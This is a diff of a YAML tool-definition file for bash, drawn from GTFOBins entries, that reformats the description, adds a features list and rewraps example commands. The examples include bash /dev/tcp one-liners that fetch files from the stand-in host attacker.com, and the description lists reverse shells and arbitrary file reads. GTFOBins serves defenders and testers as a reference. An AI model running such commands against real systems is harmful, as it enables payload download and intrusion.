@@ -2,7 +2,10 @@
 id: shell-bash-bash
 namespace: shell:bourne:bash
 name: bash
-description: GNU Bourne-Again SHell; can execute commands, read/write files, transfer data, and spawn shells Can also download files, read arbitrary files, write to arbitrary files, load arbitrary libraries, send a reverse shell, spawn an interactive shell, upload files.
+description: GNU Bourne-Again SHell; can execute commands, read/write files, transfer
+  data, and spawn shells Can also download files, read arbitrary files, write to arbitrary
+  files, load arbitrary libraries, send a reverse shell, spawn an interactive shell,
+  upload files.
 author: GTFOBins
 version: 1.0.0
 capabilities:
@@ -49,7 +52,14 @@ resource_profile:
 allowed-tools:
 - bash
 parameters: []
-features: []
+features:
+- file-system
+- interactive
+- local
+- network-intensive
+- pipes-stdin
+- process-manip
+- requires-root
 execution:
   template: bash
   sandbox: execFile
@@ -58,7 +68,10 @@ execution:
 global_vars: {}
 examples:
 - description: Download files
-  command: "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"
+  command: "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\\
+    r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n   \
+    \ | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done;\
+    \ cat; } >/path/to/output-file'"
 - description: Download files
   command: bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
 - description: Read arbitrary files
@@ -106,7 +119,6 @@ install:
   commands:
   - apt-get install -y bash
 ---
-
 
 # bash
 
